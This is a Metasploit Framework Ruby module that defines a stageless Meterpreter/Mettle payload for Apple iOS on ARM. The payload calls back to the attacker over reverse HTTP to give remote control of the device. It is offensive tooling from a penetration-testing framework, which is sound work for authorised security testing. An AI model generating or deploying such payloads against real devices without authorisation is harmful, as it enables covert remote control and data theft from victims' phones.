##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'msf/base/sessions/meterpreter_armle_apple_ios'

module MetasploitModule

  CachedSize = 639620

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Apple_iOS Meterpreter, Reverse HTTP Inline',
        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>',
          'timwr'
        ],
        'Platform'      => 'apple_ios',
        'Arch'          => ARCH_ARMLE,
        'License'       => MSF_LICENSE,
        'Handler'       => Msf::Handler::ReverseHttp,
        'Session'       => Msf::Sessions::Meterpreter_armle_Apple_iOS
      )
    )
  end

  def generate
    opts = {
      scheme: 'http',
      stageless: true
    }
    MetasploitPayloads::Mettle.new('arm-iphone-darwin', generate_config(opts)).to_binary :exec
  end
end
